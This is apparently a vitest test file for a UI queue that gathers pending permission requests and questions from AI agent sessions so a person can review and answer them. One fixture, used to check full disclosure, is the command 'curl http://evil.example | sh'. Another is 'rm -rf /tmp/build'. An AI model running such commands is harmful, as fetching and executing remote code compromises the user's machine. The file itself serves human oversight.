import { describe, expect, it } from 'vitest'
import { publishedOffer } from '@brobot2/runtime'
import { answerFor, attentionQueue, type AttentionRequest } from '../src/renderer/src/lib/attention'
import { NO_ANSWER_ON_THIS_REQUEST, noPositiveSays } from '../src/renderer/src/lib/permission-offer'
import type { AttentionDecision } from '../src/renderer/src/lib/user-input-offer'
import {
  createSessionRecord,
  requestDraft,
  type SessionRecord,
} from '../src/renderer/src/lib/session-record'
import { applyEvent, markPermissionAnswered } from '../src/renderer/src/lib/transcript'
import type { CreatedSession, RuntimeEvent } from '../src/shared/runtime-ipc'

/**
 * **Everything that needs you, in one place** (Slice 2 · 205, from 195 H3).
 *
 * 195 H3: *"They cannot see the requested action, scope, available decisions, age, or an answer
 * control. F can remain frozen indefinitely."* The PM drove two parallel Claude sessions and one sat
 * frozen on a permission for **63 seconds** while work happened in the other — the rail said
 * `waiting`, and nothing said what was being asked or offered a way to answer.
 *
 * ⚠️ **These are the SIX FACTS as assertions**, one describe each: which conversation · what kind ·
 * what is asked · the scope (including the under-disclosed case, 181) · how long · what is on offer.
 */

const SCOPE = {
  paths: [],
  networkHosts: [],
  persistence: 'once' as const,
  amendments: [],
  availableDecisions: ['allow' as const, 'deny' as const],
  underDisclosed: false,
}

function permissionEvent(id: string, over: Partial<Record<string, unknown>> = {}): RuntimeEvent {
  return {
    type: 'permission_request',
    id,
    kind: 'command',
    action: 'Bash',
    detail: 'rm -rf /tmp/build',
    scope: SCOPE,
    ...over,
  } as RuntimeEvent
}

function questionEvent(id: string, over: Partial<Record<string, unknown>> = {}): RuntimeEvent {
  return {
    type: 'user_input_request',
    id,
    prompt: 'Which colour?',
    questions: [
      {
        id: 'q1',
        prompt: 'Pick a colour',
        header: 'COLOUR',
        options: [{ label: 'Red' }, { label: 'Blue' }],
      },
    ],
    ...over,
  } as RuntimeEvent
}

/** A record as the store holds one: meta from the host, and a folded transcript. */
function recordWith(
  sessionId: string,
  events: { event: RuntimeEvent; at?: number }[],
  meta: Partial<CreatedSession> = {},
): SessionRecord {
  const record = createSessionRecord(sessionId)
  record.meta = {
    sessionId,
    provider: 'claude',
    cwd: `/Users/alex/work/folder-${sessionId}`,
    profileId: 'default',
    ...meta,
  } as CreatedSession
  record.phase = 'open'
  for (const { event, at } of events) applyEvent(record.control, event, at)
  return record
}

/** 203's word, as the rail computes it — stubbed here so the projection stays a pure function. */
const standing = (): string => 'waiting: permission'

const queueOf = (...records: SessionRecord[]): AttentionRequest[] =>
  attentionQueue(records, standing)

/** ⚑ **487 · the outcome a permission answer would send**, for the rows that carry only those. */
const outcomeOf = (decision: AttentionDecision): string =>
  decision.kind === 'permission' ? decision.decision.outcome : decision.kind

describe('the attention queue', () => {
  describe('which conversation, and what kind', () => {
    it('names the conversation, the provider and 203’s word — without opening it', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1000 }]))

      expect(queue).toHaveLength(1)
      expect(queue[0]).toMatchObject({
        sessionId: 'sess_a',
        requestId: 'req_1',
        kind: 'permission',
        // The FOLDER, not the id — which is what a person recognises at six rows.
        where: 'folder-sess_a',
        provider: 'claude',
        profileId: 'default',
        standing: 'waiting: permission',
      })
    })

    it('🔴 carries whether somebody else can drive the conversation this card came from (349)', () => {
      // ⛔ **HO-006 §4.5 on the surface where the DECISION is made.** A person can allow or deny
      // from Home without ever opening the conversation, so the disclosure that lives inside one —
      // Info's *other callers* row — never reaches them. The projection is what
      // carries the fact this far.
      const commanded = queueOf(
        recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1000 }], {
          hasACommander: true,
        }),
      )
      expect(commanded[0]?.hasACommander).toBe(true)

      // ⛔ **The paired negative, and the third state beside it.** A conversation nobody else can
      // drive says `false`; a record with NO meta at all — the state a card can reach before the
      // host has disclosed the session — says `false` too rather than `undefined`, because a
      // missing answer is not a person's to guess at.
      const ordinary = queueOf(
        recordWith('sess_b', [{ event: permissionEvent('req_2'), at: 1000 }]),
      )
      expect(ordinary[0]?.hasACommander).toBe(false)

      const undisclosed = createSessionRecord('sess_c')
      undisclosed.phase = 'open'
      applyEvent(undisclosed.control, permissionEvent('req_3'), 1000)
      expect(attentionQueue([undisclosed], standing)[0]?.hasACommander).toBe(false)
    })

    it('gathers requests from every open conversation, not just one', () => {
      const queue = queueOf(
        recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1000 }]),
        recordWith('sess_b', [{ event: questionEvent('req_2'), at: 2000 }]),
      )

      expect(queue.map((request) => request.sessionId)).toEqual(['sess_a', 'sess_b'])
      expect(queue.map((request) => request.kind)).toEqual(['permission', 'question'])
    })

    it('⛔ never TOUCHES a quiet conversation’s items — the O(1) gate, asserted', () => {
      const quiet = recordWith('sess_quiet', [
        { event: { type: 'assistant_message', text: 'done' } as RuntimeEvent, at: 1 },
      ])
      const busy = recordWith('sess_busy', [{ event: permissionEvent('req_1'), at: 2 }])

      // ⛔ **The performance guard, made observable.** Reading `items` on a conversation whose
      // `pending` is zero is the defect — 099 measured what it costs when a rail does it on every
      // delta — and a guard whose removal changes no output is a guard no test can hold. So the
      // quiet record's `items` throws if anything reads it: the gate is the only reason it does not.
      Object.defineProperty(quiet.control, 'items', {
        get() {
          throw new Error('the queue walked a conversation with nothing waiting')
        },
      })

      const queue = queueOf(quiet, busy)
      expect(queue.map((request) => request.sessionId)).toEqual(['sess_busy'])
    })

    it('⛔ skips a conversation with nothing waiting, and never walks it', () => {
      const quiet = recordWith('sess_quiet', [
        { event: { type: 'assistant_message', text: 'done' } as RuntimeEvent, at: 1 },
      ])
      // The paired positive is the whole point: the gate is `pending`, and a conversation whose
      // count is zero contributes nothing — which is what makes 30 conversations affordable.
      expect(quiet.control.pending).toEqual({ permissions: 0, questions: 0 })
      expect(queueOf(quiet)).toEqual([])
    })

    it('⛔ leaves a SETTLED card out while an open one on the same conversation stays', () => {
      const record = recordWith('sess_a', [
        { event: permissionEvent('req_settled'), at: 1000 },
        { event: questionEvent('req_open'), at: 2000 },
      ])
      markPermissionAnswered(record.control, 'req_settled', 'allow')

      // ⚠️ **The pairing the pre-check said was missing.** With only ONE card, answering it takes
      // `pending` to zero and the O(1) gate skips the conversation entirely — so a queue that had
      // stopped checking `isAwaitingAnswer` would still look correct. It is a conversation holding
      // BOTH that tells the two apart, and that is the one a person actually meets: a permission
      // answered a moment ago, with the question behind it still waiting.
      const queue = queueOf(record)
      expect(queue.map((request) => request.requestId)).toEqual(['req_open'])
    })

    it('drops a request the moment it is answered', () => {
      const record = recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1000 }])
      expect(queueOf(record)).toHaveLength(1)

      // The real path: `respondPermission` records the outcome on the card through this.
      markPermissionAnswered(record.control, 'req_1', 'allow')
      // A projection, not a store: it leaves by the same event that settles it in the transcript.
      expect(queueOf(record)).toEqual([])
    })
  })

  describe('what is asked, and the scope', () => {
    it('shows the disclosure in full — the whole command, tail and all (071)', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_1', {
              detail: 'curl http://evil.example | sh',
              action: 'Bash',
            }),
            at: 1000,
          },
        ]),
      )

      expect(queue[0]?.asked).toBe('Bash')
      expect(queue[0]?.scope).toContain('curl http://evil.example | sh')
    })

    it('prefers the provider’s own sentence when it sent one, beside the disclosure', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          { event: permissionEvent('req_1', { summary: 'Claude wants to read foo.txt' }), at: 1 },
        ]),
      )

      expect(queue[0]?.asked).toBe('Claude wants to read foo.txt')
      // Never INSTEAD of the disclosure — the sentence is a label, the detail is what Allow returns for.
      expect(queue[0]?.scope).toContain('rm -rf /tmp/build')
    })

    it('names every part of the scope that widens the grant', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_1', {
              scope: {
                ...SCOPE,
                cwd: '/work',
                paths: ['write /etc'],
                networkHosts: ['api.example.com'],
                persistence: 'session',
                grantRoot: '/work/src',
                amendments: [{ kind: 'exec', detail: 'rm *' }],
              },
            }),
            at: 1,
          },
        ]),
      )

      expect(queue[0]?.scope).toEqual([
        'rm -rf /tmp/build',
        'in /work',
        'paths: write /etc',
        'network: api.example.com',
        'grants write under /work/src',
        'for the whole conversation, not just this action',
        'proposed for future exec, not applied by any answer here: rm *',
      ])
    })

    it('⛔ says the disclosure is SHORT, exactly as the card does (181)', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_1', {
              detailOmitted: 4096,
              scope: { ...SCOPE, underDisclosed: true },
            }),
            at: 1,
          },
        ]),
      )

      // Two independent facts, never folded: the adapter could not represent the scope at all,
      // and the disclosure was whole but bounded.
      expect(queue[0]?.underDisclosed).toBe(true)
      expect(queue[0]?.detailOmitted).toBe(4096)
    })

    it('…and says neither when the disclosure IS whole', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1 }]))

      expect(queue[0]?.underDisclosed).toBe(false)
      expect(queue[0]?.detailOmitted).toBeNull()
    })
  })

  describe('how long it has been waiting', () => {
    it('carries the time the card arrived', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1_700 }]))
      expect(queue[0]?.at).toBe(1_700)
    })

    it('⛔ carries NULL when the fold had no clock, and never invents one', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: permissionEvent('req_1') }]))
      // 086: an unknown age is not a zero and not "just now". The surface says "no time recorded".
      expect(queue[0]?.at).toBeNull()
    })
  })

  describe('the order, oldest first', () => {
    it('puts the longest-frozen request at the top', () => {
      const queue = queueOf(
        recordWith('sess_new', [{ event: permissionEvent('req_new'), at: 9_000 }]),
        recordWith('sess_old', [{ event: permissionEvent('req_old'), at: 1_000 }]),
        recordWith('sess_mid', [{ event: questionEvent('req_mid'), at: 5_000 }]),
      )

      expect(queue.map((request) => request.requestId)).toEqual(['req_old', 'req_mid', 'req_new'])
    })

    it('⛔ sorts a request with NO recorded time LAST, not first', () => {
      const queue = queueOf(
        recordWith('sess_clockless', [{ event: permissionEvent('req_none') }]),
        recordWith('sess_old', [{ event: permissionEvent('req_old'), at: 1_000 }]),
      )

      // `?? 0` would have promoted every clockless card to the top — 086's rule, in a comparator.
      expect(queue.map((request) => request.requestId)).toEqual(['req_old', 'req_none'])
    })

    it('breaks an exact tie with the permission, because it freezes more', () => {
      const queue = queueOf(
        recordWith('sess_q', [{ event: questionEvent('req_q'), at: 4_000 }]),
        recordWith('sess_p', [{ event: permissionEvent('req_p'), at: 4_000 }]),
      )

      expect(queue.map((request) => request.requestId)).toEqual(['req_p', 'req_q'])
    })
  })

  describe('the decisions on offer', () => {
    it('offers exactly what the request says it accepts, and nothing else', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_1', {
              scope: { ...SCOPE, availableDecisions: ['allow', 'allow_for_session', 'deny'] },
            }),
            at: 1,
          },
        ]),
      )

      expect(queue[0]?.decisions.map((decision) => decision.label)).toEqual([
        'Allow',
        'Allow for this conversation',
        'Deny',
      ])
      // ⛔ No `updatedInput` and no deny message from here: editing what you cannot see is the
      // defect 071 exists to prevent. The plain outcome, or the card.
      expect(queue[0]?.decisions[0]).toEqual({
        kind: 'permission',
        label: 'Allow',
        decision: { outcome: 'allow' },
      })
    })

    it('🔴 draws both refusals, and says why it cannot be allowed, on the fail-closed card (487)', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_withheld', {
              scope: {
                ...SCOPE,
                // ⚑ **Derived from the product's own floor** rather than typed out, so this row
                // moves with `publishedOffer` instead of pinning a memory of it.
                availableDecisions: publishedOffer([]),
                noPositiveBecause: 'could-not-describe-the-grant',
              },
            }),
            at: 1,
          },
        ]),
      )

      // 🔴 **`483` measured this row carrying NOTHING** — *"that queue builds every control from
      // the provider-facing offer and therefore exposes neither always-honoured refusal the
      // adapter would accept"* — and 487 is the ruling it was waiting for. The row is the same
      // row; what changed is what the producer published onto it.
      expect(queue).toHaveLength(1)
      expect(queue[0]).toMatchObject({ requestId: 'req_withheld', kind: 'permission' })
      expect(queue[0]?.decisions.map(outcomeOf)).toEqual(['deny', 'cancel'])
      // ⛔ **And the row says whose decision the missing Allow was**, in the words the card uses.
      expect(queue[0]?.noPositive).toBe(noPositiveSays('could-not-describe-the-grant'))
    })

    it('⚑ …and a request that CAN be allowed carries no such sentence (487)', () => {
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_ok', {
              scope: { ...SCOPE, availableDecisions: publishedOffer(['allow']) },
            }),
            at: 1,
          },
        ]),
      )

      // ⛔ The control for the pair above (`a-positive-assertion-must-differ-from-the-default`):
      // one fact over, the row grows an Allow and loses the sentence.
      expect(queue[0]?.decisions.map(outcomeOf)).toEqual(['allow', 'deny', 'cancel'])
      expect(queue[0]?.noPositive).toBeNull()
    })

    it('⚠️ an offer with nothing in it still carries no answer, and says nothing about why (487)', () => {
      // ⛔ **The residual, and it is not reachable from any producer this app owns.** A replayed
      // ledger or an adapter this window has never met can still carry one; the row must not
      // invent a refusal for it, because the floor is a promise about a gate this window cannot
      // see. See `permission-offer.ts`'s `NO_ANSWER_ON_THIS_REQUEST`.
      const queue = queueOf(
        recordWith('sess_a', [
          {
            event: permissionEvent('req_empty', { scope: { ...SCOPE, availableDecisions: [] } }),
            at: 1,
          },
        ]),
      )

      expect(queue).toHaveLength(1)
      expect(queue[0]?.decisions).toEqual([])
      expect(queue[0]?.noPositive).toBe(NO_ANSWER_ON_THIS_REQUEST)
    })

    it('offers a question’s options one click each, plus Reject', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: questionEvent('req_1'), at: 1 }]))

      expect(queue[0]?.limit).toBeNull()
      expect(queue[0]?.decisions).toEqual([
        { kind: 'answer', label: 'Red', questionId: 'q1', option: 'Red' },
        { kind: 'answer', label: 'Blue', questionId: 'q1', option: 'Blue' },
        { kind: 'reject', label: 'Reject' },
      ])
    })

    it.each([
      [
        'multiple',
        {
          questions: [
            { id: 'q1', prompt: 'One', options: [{ label: 'A' }] },
            { id: 'q2', prompt: 'Two', options: [{ label: 'B' }] },
          ],
        },
      ],
      [
        'multi-select',
        { questions: [{ id: 'q1', prompt: 'Many', multiSelect: true, options: [{ label: 'A' }] }] },
      ],
      ['free-form', { questions: [{ id: 'q1', prompt: 'Type it', options: [] }] }],
      [
        'secret',
        { questions: [{ id: 'q1', prompt: 'Token?', secret: true, options: [{ label: 'A' }] }] },
      ],
    ])('⛔ refuses a one-click answer when the question is %s, and says why', (limit, over) => {
      const queue = queueOf(recordWith('sess_a', [{ event: questionEvent('req_1', over), at: 1 }]))

      expect(queue[0]?.limit).toBe(limit)
      // Reject SURVIVES every limit — it is protocol-safe, and an agent waiting for an answer it is
      // not going to get is exactly what this surface exists to unblock.
      expect(queue[0]?.decisions).toEqual([{ kind: 'reject', label: 'Reject' }])
    })
  })

  /**
   * ⛔ **A pure permission GRANT, which asks no question and is not a question** (207 M1).
   *
   * Codex `item/permissions/requestApproval` → `user_input_request` with `questions: []` and the
   * scope on `permission` (`codexUserPermission`, `events.ts`). Every branch of this projection saw
   * the empty array: no scope reached the row, `limitOf` called it `multiple`, and the only decision
   * offered was Reject — while `UserInputCard` two components away showed the reason, the cwd, the
   * paths and the network line, and offered **Approve**.
   *
   * ⚠️ **709 · this is the shape of a row written BEFORE 709.** Since R44 the adapter writes the
   * model's `reason` as `permission.agentReason` and its own headline as `prompt`
   * (`THE_AGENT_ASKS_FOR_ACCESS`), and no producer writes `permission.reason` — so this pins how an
   * OLD row reads. ⚑ The new field is drawn by the agent's name since `725` (R44,
   * `AttentionRequest.agentSays`), and never as a scope line — so this row keeps its shape.
   */
  describe('a permission grant with no questions (207 M1)', () => {
    const GRANT = {
      cwd: '/work',
      reason: 'write generated files',
      paths: ['write /work/out', 'read glob:**/*.ts'],
      network: true,
    }
    const grantEvent = (id: string, permission: unknown = GRANT): RuntimeEvent =>
      ({
        type: 'user_input_request',
        id,
        prompt: 'Codex would like more access',
        questions: [],
        permission,
      }) as RuntimeEvent

    it('⛔ discloses the scope the card discloses — reason, cwd, every path, the network', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: grantEvent('req_1'), at: 1 }]))

      expect(queue[0]?.asked).toBe('Codex would like more access')
      expect(queue[0]?.scope).toEqual([
        'write generated files',
        'in /work',
        // ⚑ BOTH paths, and the access label the adapter attached to each. A row that showed one of
        // two would be the under-disclosure the adapter fails closed to avoid.
        'paths: write /work/out, read glob:**/*.ts',
        'network: access requested, without naming a host',
      ])
    })

    it('⛔ offers Approve, and Approve sends the empty answer a grant approves with', () => {
      const queue = queueOf(recordWith('sess_a', [{ event: grantEvent('req_1'), at: 1 }]))

      // It used to say "asks more than one question" about a request that asks none.
      expect(queue[0]?.limit).toBeNull()
      expect(queue[0]?.decisions).toEqual([
        // ⚑ **478** — a grant's Approve says what it grants, off this request's own `permission`.
        { kind: 'approve', label: 'Approve', consent: 'access-for-this-turn' },
        { kind: 'reject', label: 'Reject' },
      ])
      // `userInputPayloadFor`: for a permission request an `answer` is `codexGrant` and a `reject`
      // is the decline. The empty `answers` is the card's own payload, not an invented one.
      expect(answerFor(queue[0]!.decisions[0]!)).toEqual({
        userInput: { kind: 'answer', answers: {} },
      })
    })

    it('⚑ …and a grant that requests nothing extra shows no line it cannot back', () => {
      // The paired positive for the four `if`s above: absence is not a claim (086), so a grant with
      // no reason, no cwd, no paths and no network renders no scope rather than four empty rows.
      const queue = queueOf(
        recordWith('sess_a', [
          { event: grantEvent('req_1', { paths: [], network: false }), at: 1 },
        ]),
      )

      expect(queue[0]?.scope).toEqual([])
      expect(queue[0]?.decisions).toHaveLength(2)
      expect(queue[0]?.underDisclosed).toBe(false)
    })

    it('🔴 a request with NO question and NO grant is APPROVED here — 213 met a plan that was not', () => {
      // ⛔ **This test asserted the opposite until 214 §3, and the assertion was the defect** (142's
      // rule: the case moves, it does not get a second home). 207 M1 fixed the SENTENCE — the row
      // used to say *"asks more than one question"* about a request that asks none — and kept the
      // premise that such a request could not be answered from here. A Claude `ExitPlanMode` is
      // exactly this shape: no questions, and no `permission`, because a plan is not a sandbox
      // scope. 213 read *"carries no question and nothing to approve — open it"* printed directly
      // under *"The agent has finished planning and asks you to approve its plan"*, with an Approve
      // button one click away inside the conversation.
      const plan = {
        type: 'user_input_request',
        id: 'req_1',
        prompt: 'The agent has finished planning and asks you to approve its plan.',
        questions: [],
        // ⚑ **478 · what the adapter really sends.** `ExitPlanMode` carries `stop-planning`, off
        // the same `PLAN_GESTURES` entry that lowers this app's own floor when the card is
        // approved — so the row's Approve can say which way it moves.
        consent: 'stop-planning',
      } as RuntimeEvent
      const queue = queueOf(recordWith('sess_a', [{ event: plan, at: 1 }]))

      expect(queue[0]?.limit).toBeNull()
      expect(queue[0]?.decisions).toEqual([
        { kind: 'approve', label: 'Approve', consent: 'stop-planning' },
        { kind: 'reject', label: 'Reject' },
      ])
      // ⚑ And it sends what the card sends — an empty answer, which `answerToForward` reports
      // forwardable (its loop has no questions to walk) and which settles Claude's plan gesture.
      expect(answerFor(queue[0]!.decisions[0]!)).toEqual({
        userInput: { kind: 'answer', answers: {} },
      })
    })
  })

  /**
   * ⛔ **An answer is on its way, so nothing may be offered again** (207 M2).
   *
   * The store's `markSent` sets `record.requests.get(id).sent` before the first await. Both ordinary
   * cards read it; this projection did not — so Allow took the broker slot, the still-live Deny came
   * back refused as not-pending, and the row vanished on the choice the user did not press last.
   */
  describe('a decision already sent', () => {
    it('⛔ marks the row sent, so the surface can take its buttons away', () => {
      const record = recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1 }])
      expect(queueOf(record)[0]?.sent).toBe(false) // the paired positive: live until pressed

      requestDraft(record, 'req_1').sent = true

      expect(queueOf(record)[0]?.sent).toBe(true)
      // ⚠️ Still LISTED. The row does not disappear on click — the host answers, the fold settles
      // the item, and only then does the projection drop it. Removing it here would be this
      // surface inventing a settlement, which is 146's defect.
      expect(queueOf(record)).toHaveLength(1)
      expect(queueOf(record)[0]?.decisions.length).toBeGreaterThan(0)
    })

    it('⛔ never CREATES a draft while projecting — a read may not grow the record', () => {
      // `requestDraft` writes an entry when there is none. Called from here it would add one per
      // pending request per render, forever: the unpruned-map shape 203 paid for on the rail.
      const record = recordWith('sess_a', [{ event: permissionEvent('req_1'), at: 1 }])

      expect(queueOf(record)[0]?.sent).toBe(false)

      expect(record.requests.size).toBe(0)
    })

    it('a sent flag belongs to ONE request, not to the conversation', () => {
      const record = recordWith('sess_a', [
        { event: permissionEvent('req_1'), at: 1 },
        { event: permissionEvent('req_2'), at: 2 },
      ])

      requestDraft(record, 'req_1').sent = true

      expect(queueOf(record).map((row) => [row.requestId, row.sent])).toEqual([
        ['req_1', true],
        ['req_2', false],
      ])
    })
  })
})
